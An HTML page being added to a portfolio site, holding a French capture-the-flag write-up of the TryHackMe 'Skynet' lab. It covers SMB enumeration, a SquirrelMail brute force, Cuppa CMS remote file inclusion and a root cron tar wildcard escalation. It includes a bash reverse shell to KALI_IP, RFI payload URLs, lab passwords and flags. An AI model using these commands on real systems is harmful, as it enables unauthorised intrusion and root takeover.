@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Skynet — TryHackMe Writeup | Alex171</title>
+    <meta name="description"
+        content="Writeup Skynet TryHackMe — SMB énumération, SquirrelMail bruteforce, RFI Cuppa CMS, Tar Wildcard Injection." />
+    <link rel="stylesheet" href="../css/style.css" />
+    <link rel="stylesheet" href="../css/animations.css" />
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>" />
+</head>
+
+<body>
+    <canvas id="matrix-canvas"></canvas>
+    <div class="grid-bg"></div>
+    <nav class="navbar">
+        <a class="nav-logo" href="../index.html">&gt;_<span> alex171</span></a>
+        <div class="nav-links">
+            <a href="../index.html">Accueil</a><a href="../about.html">À propos</a>
+            <a href="../writeups.html" class="active">Writeups</a><a href="../certifications.html">Certifications</a>
+            <a href="../projects.html">Projets</a><a href="../resources.html">Ressources</a>
+        </div>
+        <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
+    </nav>
+    <div class="mobile-menu" id="mobile-menu">
+        <a href="../index.html">Accueil</a><a href="../writeups.html">Writeups</a>
+        <a href="../certifications.html">Certifications</a><a href="../resources.html">Ressources</a>
+    </div>
+
+    <main>
+        <section class="section">
+            <div class="container">
+                <div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;"
+                    class="fade-in">
+                    <a href="../index.html" style="color:var(--text-muted);">~</a> / <a href="../writeups.html"
+                        style="color:var(--text-muted);">writeups</a> / <span style="color:var(--green);">skynet</span>
+                </div>
+                <div class="writeup-layout">
+                    <article class="writeup-content fade-in">
+                        <div style="margin-bottom:2rem;">
+                            <div
+                                style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
+                                <span class="writeup-platform">TryHackMe</span><span
+                                    class="diff diff-medium">Medium</span>
+                                <span style="font-family:var(--font-mono);font-size:0.72rem;color:var(--text-muted);">05
+                                    Mar 2026</span>
+                            </div>
+                            <h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">
+                                Skynet</h1>
+                            <div class="writeup-meta">
+                                <span class="tag">SMB</span><span class="tag">Samba</span><span
+                                    class="tag">SquirrelMail</span>
+                                <span class="tag">RFI</span><span class="tag">Tar Wildcard</span><span
+                                    class="tag">Cron</span>
+                            </div>
+                            <p style="color:var(--text-secondary);line-height:1.8;font-size:0.95rem;">
+                                Enumération SMB pour récupérer une wordlist et un username. Bruteforce de SquirrelMail,
+                                découverte
+                                d'un mot de passe MySQL. Exploitation RFI sur Cuppa CMS. Escalade via Tar Wildcard
+                                Injection
+                                dans une tâche cron root.
+                            </p>
+                        </div>
+
+                        <h2 id="nmap">Reconnaissance Nmap</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">nmap</span> -sC -sV -A lab.thm</pre>
+                        </div>
+                        <p>Services ouverts :</p>
+                        <ul>
+                            <li><strong>22/tcp</strong> — SSH</li>
+                            <li><strong>80/tcp</strong> — Apache (Skynet)</li>
+                            <li><strong>110/tcp</strong> — POP3</li>
+                            <li><strong>143/tcp</strong> — IMAP</li>
+                            <li><strong>139/445/tcp</strong> — Samba / SMB</li>
+                        </ul>
+
+                        <h2 id="smb">Enumération SMB</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">smbclient</span> -L //lab.thm/ -N
+<span class="hl-out">milesdyson   anonymous   IPC$</span>
+
+<span class="hl-bash">smbclient</span> //lab.thm/anonymous -N
+smb&gt; ls
+smb&gt; get attention.txt
+smb&gt; cd logs
+smb&gt; get log1.txt   <span class="hl-comment"># wordlist!</span></pre>
+                        </div>
+                        <p>Depuis <code>attention.txt</code> : nom d'utilisateur <strong>milesdyson</strong>.
+                            <code>log1.txt</code> contient une wordlist de mots de passe.</p>
+
+                        <h2 id="squirrelmail">SquirrelMail Bruteforce</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">ffuf</span> -u http://lab.thm/squirrelmail/src/redirect.php \
+  -d "login_username=milesdyson&secretkey=FUZZ&mailbox=INBOX" \
+  -w log1.txt \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -fc 302</pre>
+                        </div>
+                        <div class="flag-box">Mot de passe SquirrelMail : <strong>cyborg007haloterminator</strong></div>
+                        <p>Mail trouvé dans la boîte : mot de passe Samba <strong>)s{A&2Z=F^n_E.B`</strong></p>
+
+                        <h2 id="smb2">Accès SMB milesdyson</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">smbclient</span> //lab.thm/milesdyson \
+  -U milesdyson%')s{A&2Z=F^n_E.B`'
+smb&gt; get important.txt</pre>
+                        </div>
+                        <p><code>important.txt</code> révèle un répertoire caché : <code>/45kra24zxs28v3yd</code></p>
+
+                        <h2 id="rfi">RFI sur Cuppa CMS</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">gobuster</span> dir -u http://lab.thm/45kra24zxs28v3yd \
+  -w /usr/share/wordlists/dirb/common.txt
+<span class="hl-out">/administrator</span>   <span class="hl-comment"># Cuppa CMS</span></pre>
+                        </div>
+                        <p>Cuppa CMS est vulnérable à RFI via le paramètre <code>urlConfig</code> :</p>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-comment"># Héberger un reverse shell PHP sur Kali :</span>
+<span class="hl-bash">python3</span> -m http.server 80
+
+<span class="hl-comment"># URL RFI :</span>
+http://lab.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://KALI_IP/shell.php</pre>
+                        </div>
+                        <div class="flag-box">User flag : <code>7ce5c2109a40f958099283600a9ae807</code></div>
+
+                        <h2 id="cron">Escalade — Tar Wildcard Injection</h2>
+                        <p>La crontab root exécute une commande tar sur le home de milesdyson :</p>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">cat</span> /etc/crontab
+<span class="hl-out">*/1 * * * * root /home/milesdyson/backups/backup.sh</span>
+
+<span class="hl-bash">cat</span> /home/milesdyson/backups/backup.sh
+<span class="hl-out">cd /var/www/html &amp;&amp; tar cf /home/milesdyson/backups/backup.tgz *</span></pre>
+                        </div>
+                        <p>Le wildcard <code>*</code> de tar est exploitable. On crée des fichiers avec des noms
+                            spéciaux dans <code>/var/www/html</code> :</p>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash — Tar Wildcard Injection</span><button
+                                    class="copy-btn">Copier</button></div>
+                            <pre>cd /var/www/html
+
+<span class="hl-comment"># 1. Créer le script reverse shell</span>
+echo 'bash -i >& /dev/tcp/KALI_IP/9999 0>&1' > shell.sh
+
+<span class="hl-comment"># 2. "Fichiers" qui seront interprétés comme options tar</span>
+echo "" > "--checkpoint=1"
+echo "" > '--checkpoint-action=exec=sh shell.sh'
+
+<span class="hl-comment"># 3. Listener sur Kali</span>
+<span class="hl-bash">nc</span> -lvnp 9999
+<span class="hl-comment"># Attendre 1 minute → shell root !</span></pre>
+                        </div>
+                        <div class="flag-box">Root flag : <code>3f0372db24753accc7179a282cd6a949</code></div>
+
+                        <h2 id="lessons">Leçons apprises</h2>
+                        <ul>
+                            <li>SMB anonyme = enumération inévitable — désactiver l'accès anonyme en prod</li>
+                            <li>Les RFI nécessitent que allow_url_include soit activé dans PHP (mauvaise conf)</li>
+                            <li>Tar avec wildcard dans une crontab root = privesc classique à mémoriser</li>
+                            <li>Créer des fichiers nommés comme des options CLI = une technique puissante et méconnue
+                            </li>
+                        </ul>
+
+                        <div
+                            style="margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
+                            <a href="../writeups.html" class="btn btn-outline">← Tous les writeups</a>
+                            <a href="gamezone.html" class="btn btn-outline">Game Zone →</a>
+                        </div>
+                    </article>
+
+                    <aside class="writeup-sidebar">
+                        <div class="sidebar-title">Table des matières</div>
+                        <div class="toc-list">
+                            <div class="toc-item" data-target="nmap">Reconnaissance</div>
+                            <div class="toc-item" data-target="smb">SMB Enumération</div>
+                            <div class="toc-item" data-target="squirrelmail">SquirrelMail</div>
+                            <div class="toc-item" data-target="smb2">SMB milesdyson</div>
+                            <div class="toc-item" data-target="rfi">RFI Cuppa CMS</div>
+                            <div class="toc-item" data-target="cron">Tar Wildcard Cron</div>
+                            <div class="toc-item" data-target="lessons">Leçons apprises</div>
+                        </div>
+                        <hr style="border-color:var(--border);margin:1rem 0;" />
+                        <div
+                            style="display:flex;flex-direction:column;gap:0.4rem;font-size:0.78rem;font-family:var(--font-mono);">
+                            <div><span style="color:var(--text-muted);">Plateforme :</span> <span
+                                    style="color:var(--green);">TryHackMe</span></div>
+                            <div><span style="color:var(--text-muted);">Difficulté :</span> <span
+                                    style="color:#fbbf24;">Medium</span></div>
+                            <div><span style="color:var(--text-muted);">Date :</span> <span
+                                    style="color:var(--text-secondary);">05 Mar 2026</span></div>
+                            <div><span style="color:var(--text-muted);">Téchnique :</span> <span
+                                    style="color:var(--blue);">Tar Wildcard Injection</span></div>
+                        </div>
+                    </aside>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-inner">
+                <div class="footer-name">&gt;_ alex171-studo</div>
+                <div class="footer-links"><a href="../writeups.html">Writeups</a><a href="../index.html">Accueil</a>
+                </div>
+                <div class="footer-copy">© 2026 Alex171-studo</div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="interactive-terminal" class="terminal-window">
+        <div class="terminal-titlebar">
+            <div class="terminal-dot dot-red"></div>
+            <div class="terminal-dot dot-yellow"></div>
+            <div class="terminal-dot dot-green"></div>
+            <span class="terminal-title">Terminal interactif</span>
+            <button id="term-close"
+                style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
+        </div>
+        <div class="term-interactive-body" id="term-output"></div>
+        <div class="term-input-line">
+            <span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;">alex@portfolio:~$</span>
+            <input type="text" id="term-input" class="term-input" placeholder="help" autocomplete="off"
+                spellcheck="false" />
+        </div>
+    </div>
+    <button class="term-toggle-btn" id="term-toggle">&gt;_</button>
+    <script src="../js/main.js"></script>
+    <script src="../js/terminal.js"></script>
+</body>
+
+</html>
